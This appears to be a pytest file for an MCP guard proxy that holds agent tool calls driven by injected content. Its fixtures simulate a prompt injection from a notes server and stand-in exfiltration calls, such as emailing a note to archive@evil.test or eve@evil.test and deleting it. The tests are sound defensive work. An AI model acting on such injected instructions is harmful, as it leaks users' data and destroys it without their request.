"""MCP guard proxy (aisec/mcp_guard.py): policy inference, protocol logic, and an end-to-end run against a real server."""
import json
import pathlib
import subprocess
import sys

from aisec import mcp_guard

SERVER = pathlib.Path(__file__).resolve().parents[1] / "examples" / "guarded-mcp" / "notes_server.py"
TOOLS = [
    {"name": "read_note", "inputSchema": {"properties": {"note_id": {}}}},
    {"name": "send_email", "inputSchema": {"properties": {"to": {}, "body": {}}}},
    {"name": "post_webhook", "inputSchema": {"properties": {"webhook_url": {}, "payload": {}}}},
    {"name": "delete_note", "inputSchema": {"properties": {"note_id": {}}}},
    {"name": "rotate_api_key", "inputSchema": {"properties": {}}},
]


def test_policy_is_inferred_from_tool_and_parameter_names():
    p = mcp_guard.infer_policy(TOOLS)
    assert p.sinks == {"send_email": ("to",), "post_webhook": ("webhook_url",)}
    assert set(p.actions) == {"delete_note", "rotate_api_key"}


def test_policy_file_overrides_and_extends():
    p = mcp_guard.merge(mcp_guard.infer_policy(TOOLS), {"sinks": {"share": ["with_user"]}, "trusted": ["Me@Corp.test"]})
    assert p.sinks["share"] == ("with_user",) and "me@corp.test" in p.trusted


def session(request="Summarise my q3-plan note."):
    s = mcp_guard.GuardSession(request=lambda: request)
    s.from_client({"jsonrpc": "2.0", "id": 1, "method": "tools/list"})
    s.from_server({"jsonrpc": "2.0", "id": 1, "result": {"tools": TOOLS}})
    return s


def call(s, i, name, args):
    return s.from_client({"jsonrpc": "2.0", "id": i, "method": "tools/call", "params": {"name": name, "arguments": args}})


def test_calls_pass_until_a_tool_result_has_been_read():
    s = session()
    assert call(s, 2, "send_email", {"to": "x@evil.test"}) is None


def test_injected_destination_is_held_after_a_result():
    s = session()
    assert call(s, 2, "read_note", {"note_id": "q3-plan"}) is None
    s.from_server({"jsonrpc": "2.0", "id": 2, "result": {"content": []}})
    held = call(s, 3, "send_email", {"to": "archive@evil.test", "body": "..."})
    assert held["id"] == 3 and held["result"]["isError"]
    assert "archive@evil.test" in held["result"]["content"][0]["text"]


def test_destination_from_the_user_passes_and_request_is_read_per_call():
    current = {"r": "Read the q3-plan note."}
    s = mcp_guard.GuardSession(request=lambda: current["r"])
    s.from_client({"jsonrpc": "2.0", "id": 1, "method": "tools/list"})
    s.from_server({"jsonrpc": "2.0", "id": 1, "result": {"tools": TOOLS}})
    call(s, 2, "read_note", {"note_id": "q3-plan"})
    s.from_server({"jsonrpc": "2.0", "id": 2, "result": {}})
    assert call(s, 3, "send_email", {"to": "bob@corp.test"}) is not None
    current["r"] = "Now email it to bob@corp.test."
    assert call(s, 4, "send_email", {"to": "bob@corp.test"}) is None


def test_notifications_and_other_methods_are_forwarded():
    s = session()
    assert s.from_client({"jsonrpc": "2.0", "method": "notifications/initialized"}) is None
    assert s.from_client({"jsonrpc": "2.0", "id": 9, "method": "resources/list"}) is None


def test_end_to_end_against_a_real_server(tmp_path):
    log = tmp_path / "guard.jsonl"
    msgs = [
        {"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}},
        {"jsonrpc": "2.0", "method": "notifications/initialized"},
        {"jsonrpc": "2.0", "id": 2, "method": "tools/list"},
        {"jsonrpc": "2.0", "id": 3, "method": "tools/call", "params": {"name": "read_note", "arguments": {"note_id": "q3-plan"}}},
        {"jsonrpc": "2.0", "id": 4, "method": "tools/call", "params": {"name": "send_email", "arguments": {"to": "archive@evil.test", "body": "x"}}},
        {"jsonrpc": "2.0", "id": 5, "method": "tools/call", "params": {"name": "delete_note", "arguments": {"note_id": "q3-plan"}}},
    ]
    # Send one message at a time so each result arrives before the next call, as with a real agent.
    proc = subprocess.Popen(
        [sys.executable, "-m", "aisec.cli", "guard-mcp", "-r", "Summarise my q3-plan note.", "--log", str(log), "--",
         sys.executable, str(SERVER)],
        stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True,
    )
    replies = {}
    for m in msgs:
        proc.stdin.write(json.dumps(m) + "\n")
        proc.stdin.flush()
        if "id" in m:
            r = json.loads(proc.stdout.readline())
            replies[r["id"]] = r
    proc.stdin.close()
    proc.wait(timeout=10)
    assert "IMPORTANT" in replies[3]["result"]["content"][0]["text"]       # the injection reached the agent...
    assert replies[4]["result"]["isError"] and "Held by aisec guard" in replies[4]["result"]["content"][0]["text"]
    assert replies[5]["result"]["isError"]                                  # ...but neither follow-up was sent
    events = [json.loads(x) for x in log.read_text().splitlines()]
    assert [e["allowed"] for e in events if e["event"] == "call"] == [True, False, False]


# --- engine v3 -------------------------------------------------------------------------------------------------------

def session_v3(request="Summarise my q3-plan note.", **kw):
    s = mcp_guard.GuardSession(request=lambda: request, engine="v3", **kw)
    s.from_client({"jsonrpc": "2.0", "id": 1, "method": "tools/list"})
    s.from_server({"jsonrpc": "2.0", "id": 1, "result": {"tools": TOOLS}})
    return s


def read_something(s):
    call(s, 2, "read_note", {"note_id": "q3-plan"})
    s.from_server({"jsonrpc": "2.0", "id": 2, "result": {}})


def test_v3_needs_no_policy_and_holds_injected_destinations_and_actions():
    s = session_v3()
    assert call(s, 5, "send_email", {"to": "x@evil.test"}) is None        # nothing is held before a result has been read
    read_something(s)
    assert call(s, 3, "send_email", {"to": "archive@evil.test"})["result"]["isError"]
    assert call(s, 4, "delete_note", {"note_id": "q3-plan"})["result"]["isError"]


def test_v3_holds_what_v1_cannot_see():
    # An address in a parameter v1's policy does not name as a destination, and a verb in a CamelCase tool name.
    v1, v3 = session(), session_v3()
    for s in (v1, v3):
        read_something(s)
    assert call(v1, 7, "ShareDocument", {"note": "mail it to eve@evil.test"}) is None
    assert call(v3, 7, "ShareDocument", {"note": "mail it to eve@evil.test"})["result"]["isError"]


def test_v3_trusted_and_the_users_own_words_pass():
    s = session_v3("Email the plan to bob@corp.test", trusted=["me@corp.test"])
    read_something(s)
    assert call(s, 3, "send_email", {"to": "bob@corp.test"}) is None
    assert call(s, 4, "send_email", {"to": "me@corp.test"}) is None
    assert call(s, 5, "send_email", {"to": "eve@evil.test"}) is not None


def test_v3_refuses_a_v1_only_policy_file_and_unknown_engines():
    import pytest
    with pytest.raises(ValueError, match="only applies to --guard v1"):
        mcp_guard.GuardSession(request=lambda: "", engine="v3", overrides={"sinks": {"x": ["to"]}})
    with pytest.raises(ValueError, match="unknown guard engine"):
        mcp_guard.GuardSession(request=lambda: "", engine="v9")
    assert mcp_guard.GuardSession(request=lambda: "", engine="v3", overrides={"trusted": ["a@b.co"]})


def test_v1_is_still_the_default():
    assert mcp_guard.GuardSession(request=lambda: "").engine == "v1"


def test_cli_guard_check_v3():
    from typer.testing import CliRunner

    from aisec.cli import app
    run = CliRunner().invoke
    held = run(app, ["guard-check", "-r", "summarise my mail", "-t", "ShareDocument", "-a", '{"note": "to eve@evil.test"}', "--guard", "v3"])
    assert held.exit_code == 1 and "HOLD" in held.output
    ok = run(app, ["guard-check", "-r", "summarise my mail", "-t", "get_weather", "-a", "{}", "--guard", "v3"])
    assert ok.exit_code == 0 and "ALLOW" in ok.output
    bad = run(app, ["guard-check", "-r", "x", "-t", "t", "--guard", "v9"])
    assert bad.exit_code != 0


def test_end_to_end_v3_against_a_real_server(tmp_path):
    log = tmp_path / "guard.jsonl"
    msgs = [
        {"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}},
        {"jsonrpc": "2.0", "method": "notifications/initialized"},
        {"jsonrpc": "2.0", "id": 2, "method": "tools/list"},
        {"jsonrpc": "2.0", "id": 3, "method": "tools/call", "params": {"name": "read_note", "arguments": {"note_id": "q3-plan"}}},
        {"jsonrpc": "2.0", "id": 4, "method": "tools/call", "params": {"name": "send_email", "arguments": {"to": "archive@evil.test", "body": "x"}}},
        {"jsonrpc": "2.0", "id": 5, "method": "tools/call", "params": {"name": "delete_note", "arguments": {"note_id": "q3-plan"}}},
    ]
    proc = subprocess.Popen(
        [sys.executable, "-m", "aisec.cli", "guard-mcp", "-r", "Summarise my q3-plan note.", "--guard", "v3", "--log", str(log), "--",
         sys.executable, str(SERVER)],
        stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True,
    )
    replies = {}
    for m in msgs:
        proc.stdin.write(json.dumps(m) + "\n")
        proc.stdin.flush()
        if "id" in m:
            r = json.loads(proc.stdout.readline())
            replies[r["id"]] = r
    proc.stdin.close()
    proc.wait(timeout=10)
    assert replies[4]["result"]["isError"] and replies[5]["result"]["isError"]
    events = [json.loads(x) for x in log.read_text().splitlines()]
    assert [e["allowed"] for e in events if e["event"] == "call"] == [True, False, False]
    assert {"event": "policy", "engine": "v3"} in events
